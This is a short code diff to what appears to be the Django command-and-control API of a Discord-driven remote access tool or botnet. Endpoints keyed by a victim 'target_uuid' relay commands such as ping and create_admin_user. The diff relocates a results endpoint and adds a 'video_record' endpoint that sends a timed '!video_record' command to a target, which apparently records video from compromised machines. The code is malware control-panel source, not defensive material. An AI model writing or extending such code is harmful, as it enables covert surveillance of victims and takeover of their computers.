@@ -115,6 +115,10 @@ def ping(request, target_uuid):
     return JsonResponse({'channel': target_uuid, 'command': command}, safe=False)
 
 
+@api_view(['GET'])
+def get_target_results(request, target_uuid):
+    return __get_target_results(target_uuid)
+
 # ==================================== BOT INTERNAL API COMMANDS ====================================
 
 
@@ -179,5 +183,7 @@ def create_admin_user(request, target_uuid):
     return JsonResponse({'channel': target_uuid, 'command': command}, safe=False)
 
 @api_view(['GET'])
-def get_target_results(request, target_uuid):
-    return __get_target_results(target_uuid)
+def video_record(request, target_uuid, record_time):
+    command = f"!video_record {record_time}"
+    __send_discord_command(target_uuid, command)
+    return JsonResponse({'channel': target_uuid, 'command': command}, safe=False)
